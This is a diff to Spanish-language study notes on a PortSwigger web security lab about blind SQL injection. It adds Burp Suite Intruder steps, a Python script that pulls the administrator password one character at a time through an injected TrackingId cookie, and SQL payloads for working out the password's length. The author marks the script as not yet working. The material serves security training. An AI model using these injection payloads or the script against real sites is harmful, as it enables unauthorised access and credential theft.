@@ -363,7 +363,153 @@ Si se abren dos pestañas la primera la podemos cerrar, es la segunda
 
 Arriba a la izquierda nos pregunta que ataque queremos realizar, nosotros le indicamos Sniper porque vamos a estar utilizando **un único diccionario**
 
-[Vídeo de s4vitar](https://www.youtube.com/watch?v=C-FiImhUviM&t=5611s) --> 1:48:04
+Le damos a **clear** para quitar los marcados automáticamente
+Como queremos fuzzear el primer caracter se lo seleccionamos y le damos a **add**
+
+Ahora nos vamos a la **pestaña de payload** y aquí vamos a indicar porque lo queremos sustituir
+
+En caso de tener el burpsuite profesional en add from list podemos elegir que queremos poner (como de la a-z) (del 0-9), en caso de no tenerlo tenemos que ir introduciendolo a mano poniendo el carácter y dandole a **add**
+
+Una vez todos introducidos le damos a **start attack**, el botón está situado en la parte de arriba a la derecha y se empezarán a mandar solicitudes sustituyendo dicho caracter 
+
+En caso de tener el profesional, el ataque será más rápido
+
+En el laboratorio nos decía que cuando nos salierá el mensaje Welcome back en la respuesta este sería correcto, así que si le damos a la longitud vemos que hay **una que tiene más tamaño que el resto**
+
+En mi caso este salio con el 7, esto significa que el primer caracter de la contraseña del usuario es un 7
+
+Ahora para automatizar todo esto y que sea más rápido nos vamos a crear un **script en python**
+
+````python
+#!/usr/bin/python3
+
+from pwn import *
+import requests, signal, time, pdb, sys, string
+
+
+def def_handler(sig, frame):
+    print("\n\n Saliendo... \n")
+    sys.exit(1)
+
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+
+main_url = "https://0a68002203946d66c161b7190033005d.web-security-academy.net"
+characters = string.ascii_lowercase + string.digits
+
+def makeRequest():
+
+    password = ""
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando ataque de fuerza bruta")
+
+    time.sleep(2)
+
+    p2 = log.progress("Password")
+
+    for position in range(1, 21):
+        for character in characters:
+            
+            cookies = {
+                'TrackingId': "QT2UZOt1t2BoLrPk' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
+                'session': '8KGGW7SkedayXZE5adiWwkHumJ5cfAr7'
+            }
+
+            p1.status(cookies['TrackingId'])
+
+            r = requests.get(main_url, cookies=cookies)
+
+            if "Welcome back!" in r.text:
+                password += character
+                p2.status(password)
+                break
+
+if __name__ == '__main__':
+
+    makeRequest()
+
+````
+
+``from pwn import *`` --> Importar el paquete pwn instalado con pip3 para jugar con barras de progreso
+
+``import requests, signal, time, pdb, sys, string`` --> Librerías internas de python por si nos hace falta
+
+`signal.signal(signal.SIGINT, def_handler)` --> Cuando hagamos Ctrl + C vamos a llevar el flujo del programa a la función definida **def_handler**
+
+`def def_handler(sig, frame):` --> Creamos la función y le pasamos estos dos valores, si no los pone no va a funcionar
+
+``sys.exit(1)`` --> Cierre el programa con un código de estado **no exitoso**
+
+`ìf __name__ == '__main__':` --> Por donde comenzaría el flujo inicar del programa
+
+``def makeRequest():`` --> Esta función se va a encargar de aplicar toda la inyección para que a ciegas nos dumpe lo que queramos
+
+``main_url=""`` --> Variable donde vamos a almacenar la dirreción de la página
+
+La biblioteca string contiene funciones que nos devuelve ciertas palabras o números... Por ejemplo si entramos en modo interactivo de python poniendo python3, importamos string (import string) y ponemos **dir(string)** podemos ver todos los métodos que podemos usar, por ejemplo **string.printable** contiene todo
+![[Pasted image 20230129223523.png]]
+
+En nuestro caso no nos hace falta ni caracteres en mayúsculas ni caracteres especiales así que vamos a utilizar del 0-9 y de la a-z y esto lo pondríamos así:
+``string.ascii_lowercase + string.digits``
+
+### Ver la longitud de la contraseña
+Podemos utilizar está query
+````sql
+Cookie: TrackingId=L5c39ozU6bKSYZCk' and (select 'a' from users where username='administrator' AND length(password)>5)='a;
+````
+
+Si las condiciones se cumplen quedaría un a=a **daría true** y entonces mostraría el mensaje, en caso de que no se cumplieran sería false y no lo mostraría
+
+Cuando pongamos mayor que un número y creemos que es ese ponemos **>=**
+````sql
+Cookie: TrackingId=L5c39ozU6bKSYZCk' and (select 'a' from users where username='administrator' AND length(password)>=20)='a; session=rYYg2NktXiLDh0RBFAU94GULoDTtEZu
+````
+
+Y está es la forma de verificar la longitud de la contraseña, también podemos scriptearlo en python, una vez resulto esto volvemos a nuestro script de python
+
+``for position in range(1, 21):`` --> Estamos indicando que vaya del **1 al 20**, al 21 no llega. Este es el encargado de ir carácter por carácter
+
+``for character in characters`` --> Itera los valores introducidos hasta que de con la correcta
+
+``cookies = {...}`` --> Cookie que vamos a ir manipulando tras cada iteración
+Modificamos agregandole las comillas dobles y simples, quitando los iguales, para que cumpla un formato
+
+``%d`` --> marcador posicional que es un **dígito**
+
+`%s` --> marcador posicional que es un **string**
+
+``% (position, character)`` --> Indica los marcadores/posiciones, el primero es para indicar la posición y el segundo es para indicar el caracter
+
+``r = requests.get(main_url, cookies=cookies)`` --> **Tramitamos una dirección** por get a la petición almacenada en main_url y en donde a nivel de cookies le tramitas las cookies introducidas en la variable
+
+``if "Welcome back!" in r.text:`` --> Si yo detecto que la frase welcome back esta en la respuesta del lado del servidor
+
+``password ""`` --> Definición de varible vacía
+
+``password += character`` --> A la variable password le sumas el carácter correspondiente de esa posición (al estar dentro del if sabemos que se cumple)
+
+``break`` --> Para y salta a la siguiente posición y así no se pierde el tiempo
+
+``p1 = log.progress("Fuerza bruta")`` --> Creas una barra de progreso que se llame Fuerza bruta
+
+``p1.status("Iniciando ataque de fuerza bruta")`` --> Actualizamos el estado de la barra  para que ponga el mensaje indicado
+
+``time.sleep(2)`` --> Paramos el programa dos segundos para que el usuario pueda leer la información que le estamos dando
+
+``p1.status(cookies['TrackingId'])`` --> Actualizar el estado para que nos muestre en cada momento la query que se  está aplicando
+
+`p2 = log.progress("Password")` --> Otra barra de progreso donde nos va a mostrar la contraseña
+
+`p2.status(password)` --> A medida que se va componiendo o restructurando, a nivel de barra de progreso me representa la contraseña
+
+Lanzamos el programa con **python3 nombrePrograma**
+
+
+
+Seguir mirando que pasa ==el script no funciona==
+[Vídeo de s4vi](https://www.youtube.com/watch?v=C-FiImhUviM&t=6484s) 2:02:52
+
 
 # Herramientas de automatización
 Sqlmap
